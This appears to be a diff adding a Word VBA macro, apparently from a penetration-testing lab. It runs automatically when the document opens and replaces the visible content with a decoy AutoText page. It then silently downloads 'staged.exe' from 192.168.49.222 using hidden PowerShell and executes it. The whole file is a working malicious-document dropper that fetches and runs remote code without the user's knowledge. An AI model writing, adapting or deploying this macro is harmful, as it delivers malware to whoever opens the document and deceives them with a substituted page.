@@ -1,0 +1,34 @@
+Sub Document_Open()
+    SubstitutePage
+    MyMacro
+End Sub
+
+Sub AutoOpen()
+    SubstitutePage
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim str As String
+    str = "powershell Invoke-WebRequest -Uri'http://192.168.49.222/staged.exe' -Outfile 'staged.exe'"
+    Shell str, vbHide
+    Dim exePath As String
+    exePath = ActiveDocument.Path + "\staged.exe"
+    Wait (2)
+    Shell exePath, vbHide
+End Sub
+
+Sub Wait(n As Long)
+    Dim t As Date
+    t = Now
+    Do
+        DoEvents
+    Loop Until Now >= DateAdd("s", n, t)
+End Sub
+
+Sub SubstitutePage()
+    ActiveDocument.Content.Select
+    Selection.Delete
+    ActiveDocument.AttachedTemplate.AutoTextEntries("MyDoc").Insert Where:=Selection.Range, RichText:=True
+End Sub
+
